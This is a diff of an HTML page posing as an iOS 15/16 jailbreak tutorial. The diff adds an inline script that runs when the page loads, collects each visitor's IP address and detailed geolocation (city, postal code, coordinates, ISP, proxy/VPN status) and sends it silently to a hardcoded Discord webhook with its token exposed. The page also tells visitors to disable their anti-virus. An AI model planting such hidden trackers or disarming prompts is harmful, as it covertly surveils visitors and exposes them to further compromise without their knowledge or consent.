@@ -245,76 +245,120 @@
 </head>
 <body>
     <!--Tracker-->
-    <script>
-        // Fonction pour obtenir l'IP de l'utilisateur
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api64.ipify.org?format=json'); // API publique pour obtenir l'IP
-                const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                console.error("Erreur lors de l'obtention de l'IP :", error);
-                return null;
-            }
+<script>
+async function getUserIP() {
+    try {
+        const response = await fetch('https://api64.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        console.error("Erreur lors de l'obtention de l'IP :", error);
+        return null;
+    }
+}
+
+async function getIPdata(ip) {
+    try {
+        const response = await fetch(`https://ipwho.is/?ip=${ip}`);
+        const data = await response.json();
+        return data.success ? data : null;
+    } catch (error) {
+        console.error("Erreur lors de l'obtention des informations de l'adresse IP :", error);
+        return null;
+    }
+}
+
+async function sendToDiscord(ip, ipData, timeLocal, timeUTC1) {
+    const webhookURL = "https://discord.com/api/webhooks/1374706107393507328/qTSqEynflyO_VkYOrDO2NAGh05apempY1RKi87jRoynYykJXPdXebXuM20xbN4Itep_g";
+
+    const isEU = ipData.is_eu ? "Oui" : "Non";
+    const continent = `${ipData.continent} (${ipData.continent_code})`;
+    const regionCode = ipData.region_code || "Inconnu";
+    const postal = ipData.postal || "Inconnu";
+    const capital = ipData.capital || "Inconnue";
+    const callingCode = ipData.calling_code || "Inconnu";
+    const lat = ipData.latitude || "Inconnu";
+    const lon = ipData.longitude || "Inconnu";
+
+    const flagEmoji = ipData.flag?.emoji || "";
+    const country = ipData.country || "Inconnu";
+    const region = ipData.region || "Inconnue";
+    const city = ipData.city || "Inconnue";
+
+    const isp = ipData.connection?.isp || "Inconnu";
+    const ispDomain = ipData.connection?.domain || "Inconnu";
+
+    const utcAbbr = ipData.timezone?.abbr || "Inconnu";
+    const utcOffset = ipData.timezone?.utc || "Inconnu";
+    const timezoneId = ipData.timezone?.id || "Inconnu";
+    const currentTime = ipData.timezone?.current_time || timeLocal;
+
+    const content = `📌 **Nouvelle activité sur le site**
+\`\`\`
+IP           : ${ip}
+Heure locale : ${timeLocal}
+Heure UTC+1  : ${timeUTC1}
+Pays         : ${flagEmoji} ${country} (Code appel +${callingCode})
+Continent    : ${continent}
+Région       : ${region} (Code: ${regionCode})
+Ville        : ${city}
+Code postal  : ${postal}
+Latitude     : ${lat}
+Longitude    : ${lon}
+Capitale     : ${capital}
+Dans l'UE    : ${isEU}
+Fournisseur  : ${isp} (${ispDomain})
+Fuseau horaire : ${timezoneId} (${utcAbbr}, offset ${utcOffset})
+Mobile       : ${ipData.mobile ? "Oui" : "Non"}
+Proxy/VPN    : ${ipData.proxy ? "Oui" : "Non"}
+Source       : ${window.location.href}
+\`\`\``;
+
+    const payload = {
+        username: "Trackeur du site",
+        content: content
+    };
+
+    try {
+        const response = await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+        });
+
+        if (response.ok) {
+            console.log("Données envoyées à Discord !");
+        } else {
+            console.error("Erreur lors de l'envoi :", response.statusText);
         }
+    } catch (error) {
+        console.error("Erreur réseau :", error);
+    }
+}
 
-        async function ipays(){
-            try {
-                const response = await fetch('https://ip-api.com/');
-                const data = await response.json();
-                return data.ip;
-            }
-            catch (error) {
-                console.error("Erreur lors de l'obtention des infos supplémentaires :", error);
-                return null;
-            }
-        }
-        
-        // Fonction pour envoyer les données au webhook Discord
-        async function sendToDiscord(ip, iipays, time) {
-            const webhookURL = "https://discord.com/api/webhooks/1334992959581585428/v1Diuk2rp8r1a8t1dnvayh1e0w3-Rp_cfc_-ioYdYm2a-lnM_XizPnK374bgLOO1v4vS";
+function getUTC1Time() {
+    const now = new Date();
+    // UTC+1 = UTC + 3600000 ms
+    const utc1 = new Date(now.getTime() + 3600000);
+    return utc1.toLocaleString();
+}
 
-            const payload = {
-                username: "Trackeur du site",
-                content: `📌 **Nouvelle activité sur le site**\n- **IP** : ${ip}\n- **Heure** : ${time}\n- **Infos supplémentaires** : ${iipays}\n- **Source** : _index.html_`
-            };
+async function trackUserActivity() {
+    const ip = await getUserIP();
+    const timeLocal = new Date().toLocaleString();
+    const timeUTC1 = getUTC1Time();
+    const ipData = await getIPdata(ip);
 
-            try {
-                const response = await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(payload),
-                });
+    if (ip && ipData) {
+        await sendToDiscord(ip, ipData, timeLocal, timeUTC1);
+    } else {
+        console.error("Impossible de collecter toutes les données.");
+    }
+}
 
-                if (response.ok) {
-                    console.log("Ok !");
-                } else {
-                    console.error("Erreur lors de l'envoi :", response.statusText);
-                }
-            } catch (error) {
-                console.error("Erreur réseau :", error);
-            }
-        }
-
-        // Fonction principale pour collecter les données et les envoyer
-        // Fonction principale pour collecter les données et les envoyer
-        async function trackUserActivity() {
-            const userIP = await getUserIP(); // Obtenir l'IP
-            const timestamp = new Date().toLocaleString(); // Heure au format local
-            const infsup = await ipays(); // Attendre la résolution de la promesse
-            if (userIP) {
-                console.log(`IP : ${userIP}, Heure : ${timestamp}`);
-                await sendToDiscord(userIP, infsup, timestamp); // Envoyer les données au webhook
-            } else {
-                console.error("Impossible d'obtenir l'adresse IP.");}}
-
-
-        // Exécuter la fonction au chargement de la page
-        trackUserActivity();
-    </script>
-    <!--End of the tracker-->
+trackUserActivity();
+</script>
+<!--End of the tracker-->
     <div class="tdiv">
     <h1 class="title"><strong>JailBreak IOS 15 and 16</strong></h1>
     <h2>To follow this tutorial, you may need to disable your anti-virus.</h2>
